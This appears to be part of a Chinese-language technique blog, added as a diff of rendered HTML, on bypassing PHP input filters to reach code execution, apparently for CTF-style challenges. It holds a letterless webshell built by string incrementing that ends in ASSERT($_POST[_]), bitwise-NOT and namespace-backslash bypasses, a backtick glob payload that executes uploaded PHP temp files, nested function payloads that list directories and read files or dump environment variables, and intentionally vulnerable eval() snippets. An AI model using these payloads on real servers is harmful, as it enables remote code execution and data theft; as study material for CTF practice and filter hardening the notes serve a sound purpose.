+<span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span>
+<span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
+<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T</span>
+<span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
+
+<span class="token variable">$_</span><span class="token operator">=</span>$<span class="token variable">$____</span><span class="token punctuation">;</span>
+<span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ASSERT($_POST[_]);</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="第二种过滤"><a href="#第二种过滤" class="headerlink" title="第二种过滤"></a>第二种过滤</h3><ul>
+<li>长度限制为<code>&lt;=35</code></li>
+<li>除了数字和字母，也不能包括<code>_</code>和<code>$</code></li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9_$]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token punctuation">(</span><span class="token operator">~</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">'%8F%97%8F%96%91%99%90'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h4 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h4><ol>
+<li>shell下可以利用<code>.</code>来执行任意脚本</li>
+<li>Linux文件名支持用glob通配符代替</li>
+</ol>
+<p>利用Linux的通配符，<code>. xx</code>执行脚本的特性，以及PHP使用反引号执行命令的特点，得到如下：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span>`<span class="token punctuation">.</span> <span class="token operator">/</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">[</span>@<span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span>`<span class="token punctuation">;</span><span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>大写字母位于<code>@</code>与<code>[</code>之间,我们可以利用<code>[@-[]</code>来表示大写字母</strong></p>
+<p><strong>所有文件名都是小写，只有PHP生成的临时文件包含大写字母,php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</strong></p>
+<p><strong>当发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</strong></p>
+<h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p><code>\phpinfo()也可以执行</code></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token variable">$action</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以利用<code>create_function</code>函数注入。但以上代码变量$action必须包含<code>[a-z0-9_]</code>之外的字符，才会执行<code>$action(&#39;&#39;,$arg);</code></p>
+<p>可以使用<code>%5c(\)</code>绕过</p>
+<p><strong>原因：</strong></p>
+<p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">namespace</span> <span class="token package">test1</span><span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">'a'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">namespace</span> <span class="token package">test2</span><span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">'b'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">function</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">'phpinfo changed'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+
+<span class="token keyword">namespace</span><span class="token punctuation">{</span>
+    \<span class="token package">test1<span class="token punctuation">\</span>a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># a</span>
+    \<span class="token package">test2<span class="token punctuation">\</span>b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># b</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>一些函数如<code>call_user_func()</code>或<code>usort()</code>可以接受用户自定义的回调函数作为参数。回调函数不止可以是简单函数，还可以是对象的方法，包括静态类方法。</p>
+<p>闭包可以从父作用域中继承变量。 任何此类变量都应该用 use 语言结构传递进去。 <code>PHP7.1</code>起，不能传入此类变量：<code>superglobals</code>、<code>$this</code>或者和参数重名 </p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>
+
+<span class="token variable">$example</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment">#echo $example();  </span><span class="token comment" spellcheck="true">// Notice: Undefined variable: message </span>
+
+<span class="token variable">$example</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// string(5) "hello"</span>
+
+
+<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'world'</span><span class="token punctuation">;</span> 
+<span class="token keyword">echo</span> <span class="token variable">$example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//string(5) "hello"</span>
+
+<span class="token variable">$example</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arg</span> <span class="token punctuation">.</span> <span class="token string">' '</span> <span class="token punctuation">.</span> <span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token variable">$example</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// string(11) "hello world"</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><ul>
+<li>PHP是将函数以string形式传递的。</li>
+<li>可以使用任何内置或用户自定义函数，但除了语言结构例如：array()，echo，empty()，eval()，exit()，isset()，list()，print 或 unset()。</li>
+<li>一个已实例化的 object 的方法被作为 array 传递，下标 0 包含该 object，下标 1 包含方法名。 在同一个类里可以访问 protected 和 private 方法。</li>
+<li>静态类方法也可不经实例化该类的对象而传递，只要在下标 0 中包含类名而不是对象。自 PHP 5.2.3 起，也可以传递 ‘ClassName::methodName’。</li>
+<li>除了普通的用户自定义函数外，也可传递匿名函数给回调参数。</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">// An example callback function</span>
+<span class="token keyword">function</span> <span class="token function">my_callback_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">'hello world!'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">'my_callback_function'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+<span class="token shell-comment comment"># 结果</span>
+<span class="token comment" spellcheck="true">// hello world!</span>
+
+<span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span>
+    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">myCallbackMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">'Hello World!'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'MyClass'</span><span class="token punctuation">,</span> <span class="token string">'myCallbackMethod'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+<span class="token comment" spellcheck="true">// Hello World!</span>
+
+<span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span>
+    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">myCallbackMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">'Hello World!'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'MyClass'</span><span class="token punctuation">,</span> <span class="token string">'myCallbackMethod'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span> <span class="token string">'myCallbackMethod'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">//Hello World!</span>
+
+<span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">who</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"A\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">extends</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">who</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"B\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'parent::who'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// A</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'who'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// B</span>
+
+
+
+<span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">// Our closure</span>
+<span class="token variable">$double</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token variable">$a</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token variable">$numbers</span> <span class="token operator">=</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token variable">$new_numbers</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$double</span><span class="token punctuation">,</span> <span class="token variable">$numbers</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将函数作用到数组中的每个值上，每个值都乘以本身，并返回带有新值的数组</span>
+
+<span class="token keyword">print</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token variable">$new_numbers</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// 2 4 6 8 10</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="invoke魔术方法"><a href="#invoke魔术方法" class="headerlink" title="__invoke魔术方法"></a><code>__invoke</code>魔术方法</h4><p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">'Hello '</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token string">'PHP!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+
+<span class="token comment" spellcheck="true">//Hello PHP!</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="无参函数可接受参数"><a href="#无参函数可接受参数" class="headerlink" title="无参函数可接受参数"></a>无参函数可接受参数</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token function">a</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//不报错</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="嵌套函数getshell-无参数函数的利用"><a href="#嵌套函数getshell-无参数函数的利用" class="headerlink" title="嵌套函数getshell,无参数函数的利用"></a>嵌套函数getshell,无参数函数的利用</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">'bye~'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"No No No"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+
+ <span class="token comment" spellcheck="true">/*payload:
+ echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));
+ if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));
+ */</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code>scandir()   列出 images 目录中的文件和目录。//scandir()接受一个目录地址的参数，当传递为一个&quot;.&quot;时，则会返回一个数组包含当前目录下的目录名和文件名。
+end()       将内部指针指向数组中的最后一个元素，并输出。
+readfile()  输出一个文件
+localeconv()   函数返回一包含本地数字及货币格式信息的数组。
+
+----
+array(18) {
+  [&quot;decimal_point&quot;]=&gt;
+  string(1) &quot;.&quot;
+  [&quot;thousands_sep&quot;]=&gt;
+  string(0) &quot;&quot;
+  [&quot;int_curr_symbol&quot;]=&gt;
+  ....
+----
+
+current()       返回数组中的当前单元, 默认取第一个值
+pos()           current() 的别名
+readfile(end(scandir(pos(localeconv()))));//获取到当前目录的最后一个文件
+
+chdir() 函数改变当前的目录。
+next() 函数将内部指针指向数组中的下一个元素，并输出。 这里可以获取到scandir()返回的&quot;..&quot;
+将目录定义为上一目录：chdir(next(scandir(pos(localeconv()))))
+
+localtime() 函数返回本地时间。返回的类型为关联数组
+    关联数组的键名如下：
+
+    [tm_sec] - 秒数
+    [tm_min] - 分钟数
+    [tm_hour] - 小时
+    ...
+chr() 函数从指定的 ASCII 值返回字符。
+获取&quot;.&quot;的payload：chr(pos(localtime()))
+当时间为某一分钟的46秒时, pos(localtime())返回46。46是&quot;.&quot;的ASCII码值。所以payload就会返回&quot;.&quot;
+</code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+    <span class="token comment" spellcheck="true">//这里正则表达式和上面的区别在于这里还运行函数名称包含_等特殊字符</span>
+    <span class="token comment" spellcheck="true">/*payload:
+    echo(array_rand(array_flip(getenv())));
+    */</span>
